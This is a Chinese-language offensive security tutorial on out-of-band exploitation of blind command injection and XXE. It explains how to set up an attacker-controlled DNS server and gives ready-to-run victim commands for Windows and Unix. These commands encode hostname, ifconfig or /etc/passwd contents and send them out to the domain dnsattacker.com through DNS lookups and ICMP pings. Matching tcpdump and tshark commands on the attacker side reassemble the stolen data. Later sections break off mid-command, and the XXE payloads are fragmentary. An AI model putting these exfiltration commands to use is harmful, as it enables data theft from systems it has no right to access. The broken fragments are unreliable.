原文：  
介绍  
带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用所谓的盲目(blind)的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功是基于防火墙出站规则的，即允许存在漏洞的系统和外围防火墙的出站请求。
在这篇文章中，我们会讲DNS带外通道技术作为OOB攻击的最佳选择，因此下面提到的所有技术中，我们会着重讲解DNS。  
设置：启动DNS/OOB查询的基础设施  
前提条件  
具有静态IP的公网服务器：出于演示目的，我们将使用Google云平台(GCP)提供的vps服务。  
注册域：访问注册域设置，将解析权委托给你的Nameserver。我们将使用oob.dnsattacker.com来进行DNS解析。
步骤  
使用GCP服务创建一个Linux系统，具有静态IP地址。确保你有这台服务器的root权限。如果你之前没有用过GCP服务，你可以参考这个指南来创建你自己的vps。  
我的vps如图：  
我们在注册门户网的DNS设置中为我们的域添加了两条记录。第一条使用Nameserver定义了一个子域。下一步，我们为nameserver定义了A记录(GCP服务器的IP地址)。这些设置会将子域所有的DNS请求转发到GCP服务器中。设置如下图：  
我们可以使用tcpdump来观察服务器上的DNS请求，如图：  
**OS命令注入：OOB**  
我们可以通过解析精心构造的DNS名称并查找关联的DNS查询来检测Web应用程序中的OS代码注入漏洞。
**检测**  
DNS  
攻击者：使用wireshark/tcpdump指定53端口来观察响应
    sudo tcpdump -n port 53
注意：在DNS命令中，我们还可以明确定义用来解析的namenserver。
Windows
    nslookup test.oob.dnsattacker.com
    ping ping.oob.dnsattacker.com
Unix
    host host.oob.dnsattacker.com
同样地，我们也可以使用下面的命令：
    dig test.oob.dnsattacker.com
    ping test.oob.dnsattacker.com
    nslookup test.oob.dnsattacker.com
**漏洞利用和数据提取**  
DNS  
注意：使用wireshark/tcpdump指定53端口来观察响应
    tcpdump -n port 53
Windows  
受害主机：
    cmd /v /c "hostname > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR= output && certutil -encodehex -f output output.hex 4 && powershell $text=Get-Content output.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){ $final=$j.tostring()+'.'+$i+'.file.oob.dnsattacker.com';$j += 1; nslookup $final }"    # 以十六进制格式发送文件
攻击者：
    sudo tcpdump -n port 53 | tee file.txt
提取和构造输出：
    echo "0x$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')" | xxd -r -p
限制条件：需要使用powershell
Unix  
受害主机：
    var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig  $var.$b.file.oob.dnsattacker.com; done   # 以十六进制发送文件
攻击者：
    sudo tcpdump -n port 53 | tee file.txt
提取和构造输出：
    echo "0x$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')" | xxd -r -p
与十六进制编码比较，base64编码的文件更小。  
受害主机：
    var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.file.oob.dnsattacker.com; done# 以base64编码发送文件
攻击者：
    cat file2.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n'|base64 -d    # 提取输出
**ICMP**  
Windows  
受害主机：
    cmd /v /c "ipconfig > output.txt && powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send('dnsattacker.com',60 * 1000, $sendbytes, $PingOptions);
攻击者：
    sudo tcpdump 'icmp and src host 202.14.120.xx' -w powericmp.pcap  #To capture
提取数据
    echo "0x$(tshark -n -q -r powericmp.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p   #或者使用wireshark gui
限制条件：需要powershell
Unix  
受害主机：
    cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 dnsattacker.com;don
攻击者：
    sudo tcpdump  'icmp and src host 202.14.120.xx' -w icmp_file.pcap#To capture
提取数据：
    echo "0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p   #或者使用wireshark gui
**HTTP**  
Windows  
受害主机：
    cmd /v /c "ipconfig > temp && certutil -f -encodehex temp output.hex 12 && set /p MYVAR=
    &e1;
攻击者：
    sudo tcpdump -n udp port 53
限制条件：在写这篇文章时，DNS查询只能用来检测XXE漏洞。
漏洞利用和数据提取  
HTTP  
攻击者：运行python HTTP 服务器来存放dtd文件，命令如下
    python -m SimpleHttpServer 9000
受害主机：
    %sp;
    %param1;
    ]>
    &exfil;
linux.dtd文件内容如下：